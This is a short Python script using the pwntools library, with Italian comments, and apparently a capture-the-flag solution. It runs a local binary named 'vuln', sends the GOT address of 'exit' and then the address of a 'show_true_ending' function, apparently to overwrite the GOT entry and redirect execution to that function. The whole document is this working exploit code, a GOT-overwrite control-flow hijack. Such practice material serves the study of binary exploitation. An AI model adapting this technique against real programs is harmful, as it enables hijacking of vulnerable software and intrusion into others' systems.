from pwn import * 
# inizilizza il tuo programma
elf = ELF("./vuln")
#avvia il processo del file binario
p = process('./vuln')
exit = str(elf.got["exit"]).encode("ascii")
print(exit)
p.sendline(exit)
#funzione che vuoi richiamare come secondo indirizzo
function = str(elf.functions["show_true_ending"].address).encode("ascii")
print(function)
p.sendline(function)
print(str(p.recvall()))
